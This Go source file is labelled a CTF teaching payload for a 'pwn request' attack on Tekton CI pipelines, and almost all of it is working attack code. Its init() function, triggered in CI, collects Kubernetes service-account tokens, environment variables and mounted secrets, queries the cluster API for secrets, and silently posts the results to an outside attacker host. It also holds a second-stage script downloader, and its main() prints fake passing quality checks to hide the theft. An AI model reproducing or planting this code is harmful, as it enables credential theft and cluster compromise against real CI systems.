package main

/*
 * MALICIOUS PAYLOAD EXAMPLE - FOR CTF EDUCATIONAL PURPOSES ONLY
 *
 * This demonstrates the token theft attack in Tekton Pipelines
 * Similar to the GitHub Actions "Pwn Request" vulnerability
 *
 * Attack Vector:
 * 1. Attacker forks a repository that has vulnerable Tekton EventListener
 * 2. Creates scripts/quality-check/main.go with this code
 * 3. Opens a PR - triggers the vulnerable pipeline
 * 4. Pipeline clones attacker's fork and runs: go run scripts/quality-check/
 * 5. The init() function executes BEFORE main(), exfiltrating secrets
 * 6. main() shows legitimate output to avoid suspicion
 */

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// MALICIOUS: init() runs automatically before main()
// This executes even if main() is never called
// Perfect for stealth attacks!
func init() {
	// Only run malicious code in CI/CD environment
	if os.Getenv("PR_TASK_RUN") == "true" {
		go exfiltrateSecrets()
		// Give it time to complete
		time.Sleep(2 * time.Second)
	}
}

func exfiltrateSecrets() {
	// Attacker's command & control server
	attackerServer := "http://recv.hackmoltrepeat.com/tekton-loot"

	// Collect all available data
	payload := collectData()

	// Exfiltrate to attacker server
	sendData(attackerServer, payload)

	// Optional: Download and execute secondary payload
	// executeSecondStage("http://hackmoltrepeat.com/stage2")
}

func collectData() string {
	var data strings.Builder

	data.WriteString("=== TEKTON PIPELINE COMPROMISE ===\n")
	data.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format(time.RFC3339)))
	data.WriteString(fmt.Sprintf("Hostname: %s\n", os.Getenv("HOSTNAME")))
	data.WriteString("\n")

	// 1. Kubernetes Service Account Token
	data.WriteString("=== KUBERNETES SERVICE ACCOUNT TOKEN ===\n")
	saToken, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	if err == nil {
		data.WriteString(string(saToken))
		data.WriteString("\n")
	} else {
		data.WriteString(fmt.Sprintf("Error: %v\n", err))
	}
	data.WriteString("\n")

	// 2. Kubernetes Namespace
	data.WriteString("=== KUBERNETES NAMESPACE ===\n")
	namespace, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
	if err == nil {
		data.WriteString(string(namespace))
		data.WriteString("\n")
	}
	data.WriteString("\n")

	// 3. CA Certificate
	data.WriteString("=== KUBERNETES CA CERT ===\n")
	caCert, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
	if err == nil {
		data.WriteString(string(caCert))
		data.WriteString("\n")
	}
	data.WriteString("\n")

	// 4. Environment Variables (may contain secrets)
	data.WriteString("=== ENVIRONMENT VARIABLES ===\n")
	for _, env := range os.Environ() {
		data.WriteString(env)
		data.WriteString("\n")
	}
	data.WriteString("\n")

	// 5. Mounted Secrets from common locations
	data.WriteString("=== MOUNTED SECRETS ===\n")
	secretPaths := []string{
		"/workspace/secrets",
		"/tekton/secrets",
		"/etc/secrets",
		"/var/run/secrets",
	}
	for _, path := range secretPaths {
		data.WriteString(fmt.Sprintf("\n--- Scanning: %s ---\n", path))
		scanDirectory(path, &data)
	}
	data.WriteString("\n")

	// 6. Tekton-specific information
	data.WriteString("=== TEKTON INFORMATION ===\n")
	data.WriteString(fmt.Sprintf("Namespace: %s\n", os.Getenv("TEKTON_NAMESPACE")))
	data.WriteString(fmt.Sprintf("Pipeline: %s\n", os.Getenv("PIPELINE_NAME")))
	data.WriteString(fmt.Sprintf("Task: %s\n", os.Getenv("TASK_NAME")))
	data.WriteString("\n")

	// 7. Attempt to read Kubernetes API directly
	data.WriteString("=== KUBERNETES API ACCESS TEST ===\n")
	k8sAPITest := testKubernetesAPI()
	data.WriteString(k8sAPITest)
	data.WriteString("\n")

	return data.String()
}

func scanDirectory(path string, data *strings.Builder) {
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip errors
		}
		if !info.IsDir() && info.Size() < 1024*1024 { // Skip files > 1MB
			content, err := ioutil.ReadFile(filePath)
			if err == nil {
				data.WriteString(fmt.Sprintf("\nFile: %s\n", filePath))
				data.WriteString(string(content))
				data.WriteString("\n")
			}
		}
		return nil
	})
	if err != nil {
		data.WriteString(fmt.Sprintf("Error scanning %s: %v\n", path, err))
	}
}

func testKubernetesAPI() string {
	var result strings.Builder

	// Read service account token
	token, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	if err != nil {
		return fmt.Sprintf("Cannot read SA token: %v\n", err)
	}

	// Kubernetes API endpoint (in-cluster)
	apiServer := "https://kubernetes.default.svc"

	// Try to list secrets in current namespace
	namespace, _ := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Test API access
	endpoints := []string{
		fmt.Sprintf("%s/api/v1/namespaces/%s/secrets", apiServer, string(namespace)),
		fmt.Sprintf("%s/api/v1/namespaces/%s/configmaps", apiServer, string(namespace)),
		fmt.Sprintf("%s/api/v1/namespaces/%s/pods", apiServer, string(namespace)),
	}

	for _, endpoint := range endpoints {
		req, _ := http.NewRequest("GET", endpoint, nil)
		req.Header.Set("Authorization", "Bearer "+string(token))

		resp, err := client.Do(req)
		if err != nil {
			result.WriteString(fmt.Sprintf("❌ %s - Error: %v\n", endpoint, err))
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			body, _ := ioutil.ReadAll(resp.Body)
			result.WriteString(fmt.Sprintf("✓ %s - SUCCESS (200)\n", endpoint))
			result.WriteString(fmt.Sprintf("Response: %s\n", string(body[:min(500, len(body))])))
		} else {
			result.WriteString(fmt.Sprintf("❌ %s - Status: %d\n", endpoint, resp.StatusCode))
		}
	}

	return result.String()
}

func sendData(url string, data string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Post(url, "text/plain", strings.NewReader(data))
	if err != nil {
		// Silently fail - don't alert the victim
		return
	}
	defer resp.Body.Close()

	// Optional: Log success to /tmp for debugging (attacker can check logs)
	if resp.StatusCode == 200 {
		ioutil.WriteFile("/tmp/.exfil_success", []byte("OK"), 0600)
	}
}

func executeSecondStage(url string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		script, _ := ioutil.ReadAll(resp.Body)
		scriptPath := "/tmp/.stage2.sh"
		ioutil.WriteFile(scriptPath, script, 0755)

		// Execute could be done here, but we'll leave it commented
		// to keep this educational
		// exec.Command("/bin/bash", scriptPath).Run()
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// LEGITIMATE-LOOKING CODE
// This is what shows in the pipeline logs
// Hides the malicious activity that happened in init()
func main() {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     Code Quality Check v1.0.0          ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Println()

	// Fake quality checks with delays to look realistic
	checks := []struct {
		name string
		duration time.Duration
	}{
		{"Syntax validation", 500 * time.Millisecond},
		{"Code formatting", 300 * time.Millisecond},
		{"Linting rules", 700 * time.Millisecond},
		{"Security scan", 1 * time.Second},
		{"Dependency check", 600 * time.Millisecond},
		{"Best practices", 400 * time.Millisecond},
	}

	for _, check := range checks {
		fmt.Printf("Running %s...", check.name)
		time.Sleep(check.duration)
		fmt.Println(" ✓ PASS")
	}

	fmt.Println()
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║  All Quality Checks Passed!            ║")
	fmt.Println("║  Score: 100/100                        ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Println()
	fmt.Println("✓ Code is ready for merge")
	fmt.Println("✓ No issues found")
	fmt.Println()

	// Exit with success code
	os.Exit(0)
}
